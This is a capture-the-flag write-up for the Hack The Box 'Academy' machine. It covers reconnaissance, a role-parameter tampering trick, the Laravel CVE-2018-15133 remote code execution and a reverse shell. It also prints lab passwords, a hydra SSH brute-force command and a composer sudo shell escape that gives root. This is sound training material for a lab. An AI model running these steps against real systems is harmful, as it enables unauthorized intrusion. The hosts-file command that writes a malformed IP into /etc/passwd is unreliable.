---
title: "Hackthebox Academy Write-up"
date: 2021-02-26 12.40 
categories: [Hackthebox, Linux]
tags: [CVE-2018–15133, suid, privesc]
author: CEngover
image: /assets/img/posts/academy/academy.png
---

Hello, in this article I'll try to explain the solution of academy machine. The machine released in [Hackthebox](https://www.hackthebox.eu/) which is also one of the most populer penetration testing labs. 

### Reconnaissance

- Nmap Scanning
- Finding Vhost

### Exploitation

- Exploiting CVE-2018–15133

### Privilege Escalation Part 1

- Local reconnaissance
- Becoming cry0l1t3 user

### Privilege Escalation Part 2

- Finding useful audit logs
- Becoming mrb3n user

### Privilege Escalation Part 3

- Abuse of composer SUID bit


## Reconnaissance

### Nmap Scanning

First of all, let's do nmap scanning as always.

> sudo nmap -sC -sV -oA nmap/academy-open-ports -v 10.10.10.215

```bash
# Nmap 7.91 scan initiated Thu Feb 25 05:27:13 2021 as: nmap -sC -sV -oA nmap/academy-open-ports -v 10.10.10.215
Nmap scan report for 10.10.10.215
Host is up (0.075s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c0:90:a3:d8:35:25:6f:fa:33:06:cf:80:13:a0:a5:53 (RSA)
|   256 2a:d5:4b:d0:46:f0:ed:c9:3c:8d:f6:5d:ab:ae:77:96 (ECDSA)
|_  256 e1:64:14:c3:cc:51:b2:3b:a6:28:a7:b1:ae:5f:45:35 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://academy.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
```

As seen in the result of nmap, we have 2 ports open. SSH is running on port 22 and it has OpenSSH 8.2p1 version. Also nmap says it's an ubuntu server. The other one is HTTP which is running on port 80 and  has Apache 2.4.41 version. Moreover, we have a domain name which is `academy.htb`, can be seen in the result. Let's add it to our hosts file.

> sudo echo "10.10.10.215    academy.htb" >> /etc/hosts

In main page we can see that there are some pages where we can do user registration and log in. Let's try to find hidden directories and files.

> gobuster dir -u http://academy.htb -w /usr/share/wordlists/dirb/big.txt -x php,html,txt -t 100 -o academy-root-dir

```bash
/.htpasswd (Status: 403)
/.htpasswd.txt (Status: 403)
/.htpasswd.html (Status: 403)
/.htpasswd.php (Status: 403)
/.htaccess (Status: 403)
/.htaccess.php (Status: 403)
/.htaccess.txt (Status: 403)
/.htaccess.html (Status: 403)
/admin.php (Status: 200)
/config.php (Status: 200)
/home.php (Status: 302)
/images (Status: 301)
/index.php (Status: 200)
/login.php (Status: 200)
/register.php (Status: 200)
/server-status (Status: 403)
```

After finding hidden directories and files, we notice that there is also one more page which is `admin.php`. Let's jump into `register.php` page and create a user. Once we capture the request with burpsuit, we see that there is a `roleid` parameter and Its value is 0.

![Registration Request](/assets/img/posts/academy/registration.png)

If we change the value of roleid 0 to 1 we can access to some secret places. Now, we have user credentials and login pages. We can access the admin portal with the user we created on the registration page.

### Finding VirtualHost

![Admin Page](/assets/img/posts/academy/adminpage.png)

Once we log in we see that there is a virtualhost called `dev-staging-01.academy.htb`. Let's add it to hosts file, as well.

> sudo echo "10.10.10.2.15   dev-staging-01.academy.htb" >> /etc/passwd

Visit the virtualhost and look around. We see there are some useful information about the page such as APP_NAME = Laravel, APP_KEY = something.

![Laravel Config](/assets/img/posts/academy/laravel.png)

After a quick search I found a vulnerability for Laravel which is `Remote Code Execution`. Searching on the internet and I found this [laravel Exploit](https://github.com/aljavier/exploit_laravel_cve-2018-15133).

## Exploitation

Once we run the exploit that we found, we can run any command on the target. 

![Access](/assets/img/posts/academy/access.png)

We gain reverse shell on the system if we replace the exploit arguments like given in the picture.

## Privilege Escalation Part 1

In this part we can use `linpeas.sh` for information gathering. I came cross with `.env` which is like config file for laravel and saw that there is a db password. Also I found one more password in `config.php` file. Let's try ssh with these passwords.

```bash
mySup3rP4s5w0rd!!
GkEWXn4h34g8qx9fZ1

### passwords
```

```bash

g0blin
ch4p
cry0l1t3
mrb3n
egre55
21y4d

###users
```
> hydra -L users -P password 10.10.10.215 ssh

![SSH Brute Force](/assets/img/posts/academy/ssh.png)

We escalate our privileges to `cry0l1t3` user by using the same database password. Now, we can read user flag.

![User Flag](/assets/img/posts/academy/userflag.png)

## Privilege Escalation Part 2

When we list the groups that we're in, we can see that we're member of `adm` group. This group's members can read `/var/logs`. Let's run linpeas agains the system and chech what we have.

![Audit log](/assets/img/posts/academy/audit.png)

Linpeas tells us that there is a login activity with the `su` command. The text that seen next to `data` parameter will be what we need. When we convert that data with hexadecimal to text, we've `mrb3n_Ac@d3my!` password. We can use this password to login as `mrb3n` user.

## Privilege Escalation Part 3

Now, we have more privilege on the system and we have to be root.

![Sudo Privileges](/assets/img/posts/academy/sudo.png)

If we check commands that we can run with sudo rights, we can see that we can use `composer` with sudo. [GTFOBins](https://gtfobins.github.io/gtfobins/composer/) can help us about how can we abuse this binary.

![Getting Root](/assets/img/posts/academy/root.png)

```bash
TF=$(mktemp -d)
echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' >$TF/composer.json
sudo composer --working-dir=$TF run-script x
```

We gain root access by following the given commands and see root flag.